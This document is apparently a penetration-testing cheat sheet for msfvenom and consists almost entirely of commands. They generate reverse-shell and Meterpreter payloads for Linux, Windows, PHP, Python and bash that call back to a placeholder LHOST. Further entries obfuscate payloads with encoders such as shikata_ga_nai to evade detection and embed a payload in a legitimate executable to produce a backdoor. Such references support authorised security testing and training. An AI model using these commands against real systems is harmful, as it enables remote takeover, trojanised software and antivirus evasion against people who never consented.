# === BASIC SYNTAX ===
msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <format> -o <file>

# === LIST OPTIONS ===
msfvenom -l payloads
msfvenom -l encoders
msfvenom -l formats

# === COMMON PAYLOADS ===
# reverse shell (Linux)
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f elf -o shell.elf

# reverse shell (Windows)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o shell.exe

# reverse shell (PHP)
msfvenom -p php/reverse_php LHOST=<ip> LPORT=<port> -o shell.php

# reverse shell (Python)
msfvenom -p cmd/unix/reverse_python LHOST=<ip> LPORT=<port> -o shell.py

# reverse shell (bash)
msfvenom -p cmd/unix/reverse_bash LHOST=<ip> LPORT=<port> -f raw

# meterpreter (if needed)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o meterpreter.exe

# === ENCODING / OBFUSCATION ===
-e <encoder>          # encoder (e.g. x86/shikata_ga_nai)
-i <iterations>       # encode multiple times
-b "<badchars>"       # avoid bad chars (e.g. \x00\x0a)
msfvenom -p <payload> ... -e x86/shikata_ga_nai -i 3 -f exe -o encoded.exe

# === PAYLOAD OPTIONS ===
msfvenom -p <payload> --list-options

# === ADD TO EXISTING FILE (TEMPLATE) ===
-x <template.exe>     # use existing file
-k                   # keep functionality
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -x legit.exe -k -f exe -o backdoor.exe

# === NOP SLED ===
-n <size>            # add NOP sled

# === STAGED VS STAGELESS ===
# staged (smaller, needs handler)
windows/meterpreter/reverse_tcp

# stageless (larger, more stable)
windows/meterpreter_reverse_tcp
